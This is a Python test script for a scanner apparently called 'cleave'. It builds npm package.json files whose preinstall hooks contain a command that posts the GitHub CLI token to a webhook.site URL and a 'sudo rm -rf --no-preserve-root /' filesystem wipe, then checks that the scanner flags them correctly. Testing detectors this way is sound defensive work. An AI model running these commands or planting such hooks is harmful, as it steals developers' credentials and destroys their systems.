#!/usr/bin/env python3
"""Check shell command boundaries and bound token POSTs in npm hooks."""
import json
import os
from pathlib import Path
import subprocess
import tempfile

repo = Path(__file__).resolve().parents[2]
wipe = 'objectives/impact/destroy/filesystem::preinstall-root-filesystem-wipe'
token = 'objectives/exfiltration/stealer/credential/value/token::gh-cli-token-webhook-exfil'
post = 'curl -d "$(gh auth token)" https://webhook.site/11111111-1111-1111-1111-111111111111'
rm = 'sudo rm -rf --no-preserve-root /'
cases = {
    'argument-only': (post + ' ' + rm, False, True),
    'separate': (post + '; ' + rm, True, True),
    'and': (post + ' && ' + rm, True, True),
    'direct': (rm, True, False),
    'unrelated-token': ('echo "$(gh auth token)"; curl -d value https://webhook.site/11111111-1111-1111-1111-111111111111', False, False),
    'unrelated-post': ('echo "$(gh auth token)"; echo https://webhook.site/11111111-1111-1111-1111-111111111111', False, False),
}
with tempfile.TemporaryDirectory(prefix='npm-hook-boundary-') as tmp:
    paths = []
    for name, (command, _, _) in cases.items():
        path = Path(tmp) / name / 'package.json'
        path.parent.mkdir()
        path.write_text(json.dumps({'name': name, 'version': '1.0.0', 'scripts': {'preinstall': command}}))
        paths.append(str(path))
    env = os.environ.copy()
    env['CLEAVE_SKIP_CACHE'] = '1'
    result = subprocess.run([str((repo / '../cleave/target/release/cleave').resolve()), '--traits-dir', str(repo), '--format=json', *paths], check=True, capture_output=True, text=True, env=env)
    reports = [json.loads(line)['files'][0] for line in result.stdout.split('\n') if line]
    assert len(reports) == len(cases)
    for report in reports:
        name = Path(report['path']).parent.name
        ids = {t['id'] for t in report.get('traits', [])}
        assert (wipe in ids, token in ids) == cases[name][1:], (name, wipe in ids, token in ids)
print('npm hook command boundaries passed.')
